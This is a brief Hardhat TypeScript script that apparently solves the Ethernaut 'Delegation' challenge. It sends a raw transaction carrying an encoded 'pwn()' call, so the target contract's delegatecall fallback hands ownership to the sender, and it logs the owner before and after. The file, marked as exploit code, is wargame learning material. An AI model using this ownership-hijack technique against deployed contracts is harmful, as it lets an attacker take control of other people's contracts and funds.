import { deployments, ethers } from "hardhat";
import { Address, Deployment } from "hardhat-deploy/types";
import { Contract } from "ethers";
import { Delegate, Delegation } from "../typechain-types";

const delay = (ms: number) => {
    return new Promise((resolve) => setTimeout(resolve, ms));
};

const main = async () => {

    const [deployer] = await ethers.getSigners();
    const delegationAddress: Address = "0xEbe31621C2eF3FC0d0BcBD64C4fd7a0799D641A3";
    const delegation: Delegate = await ethers.getContractAt("Delegation", delegationAddress, deployer);

    let ABI = ["function pwn()"];
    let iFace = new ethers.utils.Interface(ABI);
    const data = iFace.encodeFunctionData("pwn",[]);
    console.log(`Previous owner: ${await delegation.owner()}`);
    // EXPLOIT CODE
    await deployer.sendTransaction({
        to: delegationAddress,
        data: data,
        gasLimit: 21000000
    });
    await delay(10000);
    console.log(`New owner: ${await delegation.owner()}`);
    
}

main();
